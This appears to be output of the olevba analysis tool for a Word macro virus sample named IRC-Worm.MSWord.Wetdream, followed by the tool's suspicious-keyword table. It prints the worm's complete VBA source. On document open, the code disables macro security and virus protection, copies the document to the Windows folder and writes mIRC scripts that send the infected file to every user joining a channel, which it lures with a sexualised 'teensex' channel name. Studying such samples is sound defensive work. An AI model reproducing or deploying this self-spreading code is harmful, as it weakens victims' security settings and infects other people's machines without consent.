olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: IRC-Worm.MSWord.Wetdream-f6f137323ffc795bf41c43e3d3a667ab77e8dc88
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: IRC-Worm.MSWord.Wetdream-f6f137323ffc795bf41c43e3d3a667ab77e8dc88 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: IRC-Worm.MSWord.Wetdream-f6f137323ffc795bf41c43e3d3a667ab77e8dc88 - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

On Error Resume Next

    Application.DisplayAlerts = wdAlertsNone

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then

    CommandBars("Macro").Controls("Security...").Enabled = False

    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

Else

    CommandBars("Tools").Controls("Macro").Enabled = False

    Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)

End If

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Wetdream") <> "Ahhh..." Then

    ActiveDocument.SaveAs "c:\windows\Wetdream.doc"

    If fso.fileexists("c:\mirc\mirc.ini") Then

    Open "c:\mirc\script.ini" For Output As #3

    Print #3, "[script]"

    Print #3, "n0=on 1:text:*:#: $1-30 | on 1:join:#: { /dcc send $nick c:\windows\Wetdream.doc | /j teensex } | on 1:join:#teensex: if ( $nick == $me ) /msg $chan HI YÅ!!"

    Close #3

End If

    If fso.fileexists("c:\mirc32\mirc.ini") Then

    Open "c:\mirc32\script.ini" For Output As #3

    Print #3, "[script]"

    Print #3, "n0=on 1:text:*:#: $1-30 | on 1:join:#: { /dcc send $nick c:\windows\Wetdream.doc | /j teensex } | on 1:join:#teensex: if ( $nick == $me ) /msg $chan HI YÅ!!"

    Close #3

End If

    If fso.fileexists("c:\program files\mirc\mirc.ini") Then

    Open "c:\program files\mirc\script.ini" For Output As #3

    Print #3, "[script]"

    Print #3, "n0=on 1:text:*:#: $1-30 | on 1:join:#: { /dcc send $nick c:\windows\Wetdream.doc | /j teensex } | on 1:join:#teensex: if ( $nick == $me ) /msg $chan HI YÅ!!"

    Close #3

End If

    If fso.fileexists("c:\program files\mirc32\mirc.ini") Then

    Open "c:\program files\mirc32\script.ini" For Output As #3

    Print #3, "[script]"

    Print #3, "n0=on 1:text:*:#: $1-30 | on 1:join:#: { /dcc send $nick c:\windows\Wetdream.doc | /j teensex } | on 1:join:#teensex: if ( $nick == $me ) /msg $chan HI YÅ!!"

    Close #3

End If

    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Wetdream") = "Ahhh..."

Else

    MsgBox "Not enough memory!", vbCritical, "Warning!"

End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

